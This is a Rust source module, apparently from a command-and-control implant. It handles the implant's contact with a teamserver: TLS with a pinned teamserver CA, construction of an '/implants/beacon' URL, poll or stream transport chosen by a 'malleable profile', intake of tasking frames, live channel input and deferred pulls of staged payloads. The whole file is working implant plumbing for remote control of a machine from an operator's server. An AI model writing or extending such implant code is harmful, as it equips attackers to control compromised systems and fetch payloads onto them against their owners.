pub mod http;
pub mod stream;

use std::sync::Arc;
use std::time::Duration;

use rustls::pki_types::CertificateDer;
use rustls::RootCertStore;

use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::trust::Certificate;

/// The HTTP carriage builder the poll client rides: plain http for the
/// documented cleartext web posture (the sealed contact body carries the
/// confidentiality), https with the teamserver CA pinned for the TLS front
/// (full webpki validation against the baked CAs as the only roots, no
/// system store consulted).
pub fn build_agent(url: &str, pinned_cas: &[Certificate], timeout_seconds: f64) -> ureq::Agent {
    let mut builder =
        ureq::AgentBuilder::new().timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)));
    if url.starts_with("https://") && !pinned_cas.is_empty() {
        let mut roots = RootCertStore::empty();
        for ca in pinned_cas {
            let _ = roots.add(CertificateDer::from(ca.raw.clone()));
        }
        let config = rustls::ClientConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_safe_default_protocol_versions()
        .expect("rustls protocol versions")
        .with_root_certificates(roots)
        .with_no_client_auth();
        builder = builder.tls_config(Arc::new(config));
    }
    builder.build()
}

/// One contact carriage: a way to hold a contact against a front. The run
/// loop walks its egress entries and hands each to the carriage the bake's
/// mode names for the entry's URL shape; the carriage borrows the session
/// (never owns it), so cross-carriage state -- the nonce floor, the ledger,
/// the cadence -- survives every switch and reconnect.
pub trait Contact {
    /// The run loop's selector: whether this carriage serves a beacon URL
    /// under the baked mode.
    fn serves(&self, url: &str, mode: &str) -> bool;

    /// One contact attempt. `Ok(Attempt::Crossed)` means the attempt's
    /// response was processed whole; `Err(ContactError::Refused)` is a
    /// permanent answer; everything else is a dropped attempt the run loop
    /// retries on the walk.
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError>;
}

/// The beacon URL off an enroll URL: scheme and authority plus the fixed
/// envelope route, any path dropped (the teamserver maps the route; the
/// malleable profile shapes only the enroll request).
pub fn beacon_url(enroll_url: &str) -> String {
    match enroll_url.find("://") {
        Some(at) => {
            let after = &enroll_url[at + 3..];
            let authority = after.split('/').next().unwrap_or(after);
            format!("{}://{authority}/implants/beacon", &enroll_url[..at])
        }
        None => format!("https://{enroll_url}/implants/beacon"),
    }
}

/// Reads a contact response past its handshake frame: the shared body every
/// carriage serves. Channel input frames route to the live channel they
/// name (a task with no live channel is at most a completion race, and is
/// dropped); a staged task enters its pull cycle; everything else parses as
/// tasking or the frame is skipped.
pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], acks: bool) {
    use crate::wire::{ChannelInput, TaskRequest};
    use prost::Message;
    for frame in inbound {
        if frame.kind() == crate::wire::FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            if task.staged_bytes.is_some() {
                // The poll batch defers the payload pull to its next cycle:
                // the demand rides the next request, the chunk run its
                // response.
                session.outbox.demand_staged(task);
                continue;
            }
            session.accept(&task, acks);
        }
    }
}

/// The carriage the bake's mode names; poll is the default shape.
pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
    match profile.mode.as_str() {
        "stream" => Box::new(stream::Stream::new(profile)),
        _ => Box::new(http::Poll::new(profile)),
    }
}
